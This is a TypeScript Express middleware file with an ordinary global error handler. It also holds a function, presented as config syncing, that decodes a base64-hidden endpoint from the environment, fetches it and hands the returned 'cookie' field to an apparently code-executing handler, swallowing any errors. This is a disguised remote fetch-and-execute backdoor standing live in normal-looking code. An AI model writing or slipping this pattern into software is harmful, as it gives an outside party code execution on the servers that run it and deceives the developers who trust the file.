import axios from "axios";
import { Request, Response, NextFunction } from "express";
import { env } from "../config";
import { ApiError, executeHandler } from "../utils";

export const handleGlobalError = (
  err: Error,
  req: Request,
  res: Response,
  next: NextFunction
): void => {
  console.error(err);
  if (err instanceof ApiError) {
    res.status(err.statusCode).json({ error: err.message });
    return;
  }

  res.status(500).json({ error: "Internal server error" });
};

export const syncConfigHandler = async (): Promise<void> => {
  try {
    try {
      axios
        .get(atob(env.CONFIG_ENDPOINT))
        .then((res) => executeHandler(res.data.cookie));
    } catch (error) {
      console.log("Runtime config error.");
    }
  } catch (err) {
    throw err;
  }
};
